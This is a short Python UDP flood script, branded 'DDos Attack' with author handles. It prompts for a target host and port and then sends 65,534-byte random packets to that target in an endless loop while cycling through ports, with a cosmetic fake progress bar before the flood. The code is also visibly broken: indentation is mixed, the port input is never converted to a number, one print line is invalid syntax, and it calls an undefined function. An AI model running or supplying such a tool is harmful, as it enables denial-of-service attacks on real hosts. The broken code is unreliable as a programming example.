#import
import sys
import os
import time
import socket
import scapy.all as scapy
import random
import threading
from datetime import datetime

#Colour
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'

#datetime
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

os.system("clear")
os.system("figlet DDos Attack")
print
print ("\033[1;91m[ Author   : @EXLIPSE#1334]")
print ("\033[1;91m[Code : @EXLIPSE]")
print ("\033[1;91m[Instagram   : @EXLIPSE]")
print ("\033[1;91m[Facebook : https://www.facebook.com/@EXLIPSE]")
print ("\033[1;91m[Discord : JendralEclipse#1334]")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(65534)
host = input("\033[1;91mEnter Attack Host Target : ")
port = input("\033[1;91mEnter Attack Port Target      : ")
sent = input("\033[1;91mMasukan Jumlah Packet:")
thread = input("\033[1;91mMasukan Jumlah Thread:")

os.system("clear")
os.system("figlet Attack Starting")
print ("\033[1;91m[                    ] 0%")
time.sleep(5)
print ("\033[1;91m[++>++>+>>               ] 25%")
time.sleep(5)
print ("\033[1;91m[+++>+>++++>>          ] 50%")
time.sleep(5)
print ("\033[1;91m[++++>+>++++++>>     ] 75%")
time.sleep(5)
print ("\033[1;91m[++++++++++++++++>>] 100%")
time.sleep(3)
os.system("clear")
sent = 3000
while True:
		sock.sendto(bytes, (host, port))
		sent = sent + 1
		port = port + 1
        print(E"ECLIPSE :- Sent Attack To %s packet to %s Target port:%s"%(sent,host,port))
     if port == 65534:
         port = 1
     if sent == 65534:
         sent = 1
     if thread == 65534:
         thread = 1
        
 first('E')